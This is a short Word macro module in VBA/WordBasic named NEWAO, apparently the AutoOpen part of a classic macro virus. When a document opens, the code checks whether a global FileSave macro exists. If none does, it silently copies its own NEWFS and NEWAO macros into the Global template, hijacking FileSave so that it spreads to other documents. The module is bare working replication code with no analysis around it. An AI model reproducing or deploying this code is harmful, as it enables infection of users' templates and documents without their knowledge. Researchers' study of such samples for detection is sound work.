   Attribute VB_Name = "NEWAO"

   Public Sub MAIN()
   Dim iMacroCount
   Dim i
   Dim bTooMuchTrouble
   Dim sMe$
   Dim sMacro$
       On Error GoTo -1: On Error GoTo Abort
       iMacroCount = WordBasic.CountMacros(0, 0)
       For i = 1 To iMacroCount
           If WordBasic.[MacroName$](i, 0, 0) = "FileSave" Then
               bTooMuchTrouble = -1
           End If
       Next i
       If Not bTooMuchTrouble Then
           'add FileSaveAs and copies of AutoOpen and FileSaveAs.
           sMe$ = WordBasic.[FileName$]()
           sMacro$ = sMe$ + ":NEWFS"
           WordBasic.MacroCopy sMacro$, "Global:FileSave"
           sMacro$ = sMe$ + ":NEWFS"
           WordBasic.MacroCopy sMacro$, "Global:NEWFS"
           sMacro$ = sMe$ + ":NEWAO"
           WordBasic.MacroCopy sMacro$, "Global:NEWAO"
       End If
   Abort:
   End Sub
